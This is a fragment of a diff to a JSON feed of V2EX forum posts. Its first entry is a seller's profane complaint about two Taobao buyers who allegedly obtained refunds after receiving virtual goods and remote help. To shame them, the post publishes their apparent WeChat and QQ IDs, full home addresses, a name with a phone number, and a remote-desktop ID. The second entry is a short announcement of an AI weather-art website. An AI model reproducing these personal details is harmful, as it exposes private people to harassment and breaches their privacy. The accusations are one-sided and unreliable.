           "description": "kingpo: 非常糟心。近期遇到两个。\n虚拟商品，其中一个陕西买家都收货了，我期间远程还额外提供技术服务帮忙调试网络，弄了几个小时，他妈的收货后，隔两天发起售后退款，发现被直接拉黑，写不想要了没收到货，我填了一堆说明，截图聊天证据，并且购买前有聊天说明虚拟商品，当天有效。这逼又改成未收到实物退款，真他妈搞笑，虚拟商品你收个 bi 实物，淘宝小二介入，我猜小二看都没看我的证明材料，问我能不能补偿一点，我说不能，并补充说明，一再强调只求他们能公平公正公平公正判定，结果小二还是直接判未收货同意退款。心力交瘁。垃圾平台加遇垃圾人真是恶心到我了，卖家当狗。\n另一个人东莞的也非常恶心，一再讲价磨磨唧唧，最后我还同意降价给他，远程他电脑处理，期间加了微信，处理完成后，随后一天淘宝发起退款。微信拉黑，没法维权，淘宝都是判退款，真的恶心。\n贴一下这两人信息，真他妈一点良心底线都没有。我是越想越气，虽然只是几十块，但是这俩都前前后后都花费好几个钟时间精力，我真没法想象这些人能无耻到这种程度，但凡我不是花了那么多时间精力，我还不至于这么气，这些无良无耻的人定遭天谴。\n遇到这种垃圾人，只能认栽吗？有什么维权渠道？\n陕西的，\n微信号：qq2661532104\nqq：2661532104\n收货地址：陕西省 延安市 延川县 永坪镇永州小区\n\n东莞的，号码应该是淘宝的虚拟号\n微信号：CFK1215\n电脑向日葵：1281748932 ，单次验证码\n收货地址：陈东，18825723565-9514 ，广东省 东莞市 清溪镇 重河河板桥西三巷一号，楼上 302 ，禁止放便利店和驿站 \nhttps://s3.bmp.ovh/imgs/2025/01/23/91056a1988f67328.png\nhttps://s3.bmp.ovh/imgs/2025/01/23/7a8693c1ff062113.png\nhttps://s3.bmp.ovh/imgs/2025/01/23/316e4333986291ef.png",
           "link": "https://www.v2ex.com/t/1107528",
           "publishedOn": "2025-01-24T03:07:01.000Z",
-          "wordCount": 411,
+          "wordCount": 424,
           "title": "垃圾淘宝平台，遇到无良买家，卖家真不如狗，都只会偏袒买家，只能认栽吗？",
           "imageUrl": null
         },
@@ -598,7 +666,7 @@
           "description": "Frytea: \n前阵子对 ai 生成城市天气画报很感兴趣，突发奇想做一个 Ai 全球城市天气网站，每天定时生成全球主要城市天气实况的 ai 天气画报。\n目前激活了不到 100 个城市，每 6h 生成一次，已经生产了 200 多幅画报，感觉还挺有意思，分享出来：\n地址： https://todayaiweather.com/\n期待大家的反馈建议。",
           "link": "https://www.v2ex.com/t/1107527",
           "publishedOn": "2025-01-24T03:07:00.000Z",
-          "wordCount": 451,
+          "wordCount": 459,
           "title": "一个有趣的网站：全球城市 AI 艺术天气",
           "imageUrl": null
         }
